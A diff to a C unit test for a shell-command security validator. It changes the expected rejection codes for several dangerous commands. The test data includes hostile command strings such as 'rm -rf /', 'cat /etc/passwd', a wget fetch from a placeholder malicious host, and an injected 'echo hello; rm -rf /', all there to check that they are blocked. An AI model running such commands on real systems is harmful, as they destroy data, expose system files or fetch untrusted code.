@@ -5,6 +5,7 @@
  * @date 2025-07-25
  */
 
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -54,10 +55,10 @@ static void test_command_validation(void) {
     assert(security_validate_command("ls -la") == SECURITY_VALID);
     
     // Test dangerous commands
-    assert(security_validate_command("rm -rf /") == SECURITY_INJECTION_DETECTED);
+    assert(security_validate_command("rm -rf /") == SECURITY_PERMISSION_DENIED);
     assert(security_validate_command("sudo rm file") == SECURITY_PERMISSION_DENIED);
     assert(security_validate_command("cat /etc/passwd") == SECURITY_PERMISSION_DENIED);
-    assert(security_validate_command("wget http://malicious.com/script.sh") == SECURITY_INJECTION_DETECTED);
+    assert(security_validate_command("wget http://malicious.com/script.sh") == SECURITY_PERMISSION_DENIED);
     
     // Test command injection
     assert(security_validate_command("echo hello; rm -rf /") == SECURITY_INJECTION_DETECTED);
